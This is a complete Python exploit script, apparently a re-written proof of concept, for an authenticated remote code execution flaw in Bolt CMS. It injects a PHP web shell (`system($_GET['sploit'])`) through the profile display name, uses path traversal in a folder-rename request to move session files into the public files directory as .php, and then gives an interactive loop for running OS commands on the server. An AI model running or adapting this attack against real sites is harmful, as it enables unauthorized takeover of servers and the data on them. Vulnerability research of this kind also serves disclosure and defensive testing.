# Original Vulnerability Discoverer: Sivanesh Ashok - https://seclists.org/fulldisclosure/2020/Jul/4
# Original PoC Script Author: r3m0t3nu11 - https://github.com/r3m0t3nu11/Boltcms-Auth-rce-py | https://www.exploit-db.com/exploits/48296
# Re-write Author: SlizBinksman https://github.com/SlizBinksman

#!/usr/bin/python3

import argparse
import requests
import re
from socket import error
from os import system
from bs4 import BeautifulSoup
from sys import exit

Session = requests.session()

def banner():
    banner = """
 ____  ____  _   _____    ____  _     _____  _       ____  ____  _____
/  __\/  _ \/ \ /__ __\  /  _ \/ \ /\/__ __\/ \ /|  /  __\/   _\/  __/
| | //| / \|| |   / \    | / \|| | ||  / \  | |_||  |  \/||  /  |  \  
| |_\\\\| \_/|| |_/\| |    | |-||| \_/|  | |  | | ||  |    /|  \__|  /_ 
\____/\____/\____/\_/    \_/ \|\____/  \_/  \_/ \|  \_/\_\\\\____/\____\\

[+] Discovered By:           Sivanesh Ashok    https://seclists.org/fulldisclosure/2020/Jul/4
[+] Original PoC Author:     r3m0t3nu11        https://github.com/r3m0t3nu11/Boltcms-Auth-rce-py                                                   
[+] PoC Re-Write:            SlizBinksman      https://github.com/SlizBinksman

[!] Note: SlizBinksman Does NOT TAKE ANY CREDIT For The Original Discovery and
          Exploitation Of This Vulnerability. This Script Is A Re-Write Based on 
          r3m0t3nu11's Original PoC Script And Sivanesh Ashoks White Paper
          Describing What Made The Code Vulnerable To Such An Attack.\n"""
    print(banner)

def loginRequest():
    try:
        loginToken = BeautifulSoup(Session.get(f"{args.URL}/bolt/login").text, 'html.parser').findAll('input')[2].get('value')
        print(f'[*] Got Login Token: {loginToken}')

        loginInfo= {
            "user_login[username]": args.Username,
            "user_login[password]": args.Password,
            "user_login[login]": "",
            "user_login[_token]": loginToken
        }

        Session.post(f"{args.URL}/bolt/login", loginInfo)
        print('[*] Sent Login Information Post Request')

    except IndexError:
        exit('[-] Could Not Get Login Token')

    except error:
        exit('[-] Could Not Connect To Server')

    else:
        return manipulateDisplayName()

def manipulateDisplayName():
    try:
        profileToken = BeautifulSoup(Session.get(f"{args.URL}/bolt/profile").content,'html.parser').findAll('input')[6].get('value')
        print(f"[*] Got Profile Token: {profileToken}")
        data_profile = {
        "user_profile[password][first]": "password",
        "user_profile[password][second]": "password",
        "user_profile[email]": "ODB@Wutang.com",
        "user_profile[displayname]": "<?php system($_GET['sploit']);?>",
        "user_profile[save]": "",
        "user_profile[_token]": profileToken
        }

        Session.post(f"{args.URL}/bolt/profile", data_profile)
        print('[*] Posted New Data Profile. Displayname Changed To <?php system($_GET[\'sploit\']);?>')

    except IndexError:
        exit('[-] Could Not Get Profile Token')

def getCSRFToken():
    try:
        csrfToken = BeautifulSoup(Session.get(f"{args.URL}/bolt/overview/showcases").text, 'html.parser').findAll('div')[12].get("data-bolt_csrf_token")
        print(f'[*] Found CSRF Token: {csrfToken}')
        return csrfToken

    except IndexError:
        exit('[-] Could Not Get CSRF Token')

def searchRenameAndInject():

    csrfToken = getCSRFToken()

    sessions = BeautifulSoup(Session.get(f"{args.URL}/async/browse/cache/.sessions?multiselect=true").text,'html.parser').find_all('span', class_='entry disabled')

    for session in sessions:

        with open("session.txt", "a+") as file:
            file.write(session.text + "\n")
            file.close()
        numbers = sum(1 for line in open('session.txt'))

        renameData = {
            "namespace": "root",
            "parent": "/app/cache/.sessions",
            "oldname": session.text,
            "newname": f"../../../public/files/sploit{numbers}.php/.",
            "token": csrfToken
        }
        Session.post(f"{args.URL}/async/folder/rename", renameData)

        try:
            url = f"{args.URL}/files/sploit{numbers}.php?sploit=ls%20-la"
            file = requests.get(url).text
            findPHP = re.findall('php', file)
            array = findPHP[0]

            if array == "php":
                fileInjection = f"sploit{numbers}"
                print(f"[*] Found File: {fileInjection}")
                return shell(fileInjection)

            else:
                system('rm session.txt')
                exit('[-] Could Not Find Session Token Containing Payload!')

        except IndexError:
            pass

def chooseOutput():
    outputBool = input('[*] Would You Like Raw Or Refined Output From Your Commands?[raw/refined]: ')

    if outputBool == 'refined':
        print('[*] Using Refined Command Output!')
        boolean = True
        return boolean

    elif outputBool == 'raw':
        print('[*] Using Raw Command Output!')
        boolean = False
        return boolean

    else:
        print('[!] Invalid Choice! Use "raw" For Raw Output Or Use "refined" For Refined Output.')
        return chooseOutput()

def shell(file):
    refinedOutPut = chooseOutput()
    print('[*] Dropping Into Command Shell. Use CTRL C To Quit!')

    while True:

        try:
            command = input('OS Command: ')
            sendCommand = requests.get(f'{args.URL}/files/{file}.php?sploit={command}')
            responseText = sendCommand.text
            if refinedOutPut:
                output = re.search('...displayname";s:32:"(.*?)"', responseText,re.DOTALL).group(1)
                print(output.strip())
            if not refinedOutPut:
                output = re.findall('...displayname";s:..:"([\w\s\W]+)', responseText)
                print(output[0])

        except NameError:
            system('rm session.txt')
            exit('[-] Could Not Find File')

        except KeyboardInterrupt:
            system('rm session.txt')
            exit('\n[!] Aborting')

def exploit():
    try:
        loginRequest()
        searchRenameAndInject()

    except KeyboardInterrupt:
        exit('[!] Aborting')

if __name__ == '__main__':

    mainarguments = argparse.ArgumentParser()

    mainarguments.add_argument('URL', help='URL hosting BOLT CMS', type=str)
    mainarguments.add_argument('Username', help='BOLT CMS Username', type=str)
    mainarguments.add_argument('Password', help='BOLT CMS Password', type=str)

    args = mainarguments.parse_args()

    banner()
    exploit()